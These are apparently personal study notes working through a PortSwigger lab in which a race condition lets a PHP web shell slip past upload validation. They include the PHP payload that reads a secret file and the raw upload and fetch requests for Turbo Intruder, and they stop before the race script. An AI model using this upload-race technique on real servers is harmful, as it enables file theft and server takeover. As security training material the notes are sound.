
# #PortSwigger 


![[Pasted image 20260616152047.png]]


## Lab Description

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

**Objective:** Upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

**Credentials:** `wiener:peter`

----
---

### Step 1: Observe Normal Upload Flow

1. Log in as `wiener:peter`
2. Upload a legitimate image as your avatar
3. Go to your account page and note the GET request:
```
GET /files/avatars/<YOUR-IMAGE>.jpg
```

---

### Step 2: Create the Malicious PHP Script

Create a file named `exploit.php` containing:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Step 3: Attempt Normal Upload (Optional)

Try uploading `exploit.php` normally. The server will reject it (not an image).

---

### Step 4: Install Turbo Intruder

1. Go to **Burp Suite** → **Extender** → **BApp Store**
2. Search for **Turbo Intruder**
3. Click **Install**

---

### Step 5: Send to Turbo Intruder

1. Find the `POST /my-account/avatar` request (the one used to upload the avatar)
2. Right-click → **Extensions** → **Turbo Intruder** → **Send to turbo intruder**

---

### Step 6: Prepare the Requests

**Request 1 (POST - Upload exploit.php):**

Replace the filename in the `Content-Disposition` header with `exploit.php`:
```
POST /my-account/avatar HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR_SESSION
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Length: [CALCULATE]

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryXYZ--
```

**Request 2 (GET - Fetch exploit.php):**
```
GET /files/avatars/exploit.php HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
```

 